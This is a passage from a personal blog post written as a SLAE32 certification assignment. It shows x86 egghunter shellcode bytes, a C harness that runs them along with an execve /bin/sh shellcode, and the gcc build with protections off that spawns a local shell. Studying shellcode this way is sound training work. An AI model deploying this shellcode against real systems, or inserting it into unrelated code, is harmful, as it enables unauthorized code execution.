</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">39</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--------------------
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
</span></span><span style="display:flex;"><span>--------------------
</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> egghunter[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Egg hunter length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(egghunter));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(shellcode));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>s)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)egghunter;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>I used the <code>execve shellcode stack</code> covered during the course to execute a shell .</p>
<p>Compiling with <code>gcc</code> and executing it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -m32 -z execstack -o egghunter_tester shellcode.c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ ./egghunter_tester 
</span></span><span style="display:flex;"><span>Egg hunter length: <span style="color:#ae81ff">39</span>
</span></span><span style="display:flex;"><span>Shellcode length: <span style="color:#ae81ff">33</span>
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,25<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,29<span style="color:#f92672">(</span>audio<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,44<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,109<span style="color:#f92672">(</span>netdev<span style="color:#f92672">)</span>,111<span style="color:#f92672">(</span>bluetooth<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>scanner<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>egg_hunter  egg_hunter.nasm  egg_hunter.o  egghunter_tester  shellcode  shellcode.c
</span></span><span style="display:flex;"><span>$ 
</span></span></code></pre></div><p>We get a shell!!!</p>
<hr>
<p>This blog post has been created for completing the requirements
of the SecurityTube Linux Assembly Expert certification:
<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
<ul>
<li>Now at: <a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></li>
</ul>
<p><code>Student ID: PA-31319</code></p>
<p>All the source code files are available on GitHub at <a href="https://github.com/0xnibbles/slae_x86">https://github.com/0xnibbles/slae_x86</a></p>
<hr>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://0xnibbles.github.io/tags/slae32/">slae32</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://0xnibbles.github.io/posts/slae32/slae_32_assignment_4/">
    <span class="title">« Prev</span>
    <br>
    <span>SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)</span>
  </a>
  <a class="next" href="https://0xnibbles.github.io/posts/slae32/slae_32_assignment_2/">
    <span class="title">Next »</span>
    <br>
    <span>SLAE32 Assignment 2 - TCP Reverse Shellcode</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE32 Assignment 3 - Egghunter Shellcode on twitter"
        href="https://twitter.com/intent/tweet/?text=SLAE32%20Assignment%203%20-%20Egghunter%20Shellcode&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae32%2fslae_32_assignment_3%2f&amp;hashtags=slae32">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE32 Assignment 3 - Egghunter Shellcode on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae32%2fslae_32_assignment_3%2f&amp;title=SLAE32%20Assignment%203%20-%20Egghunter%20Shellcode&amp;summary=SLAE32%20Assignment%203%20-%20Egghunter%20Shellcode&amp;source=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae32%2fslae_32_assignment_3%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
</div>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://0xnibbles.github.io/">nibbles</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
